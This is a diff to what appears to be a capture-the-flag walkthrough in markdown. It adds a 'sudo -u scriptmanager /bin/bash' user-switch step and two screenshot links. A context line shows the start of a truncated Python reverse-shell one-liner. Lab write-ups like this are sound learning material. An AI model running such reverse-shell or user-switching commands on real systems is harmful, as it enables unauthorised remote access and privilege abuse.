@@ -89,3 +89,17 @@ python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STRE
     
 - Tape `export TERM=xterm`
 
+
+
+
+```
+sudo -u scriptmanager /bin/bash
+```
+
+
+
+
+![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311034223.png)
+
+
+![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311034227.png)
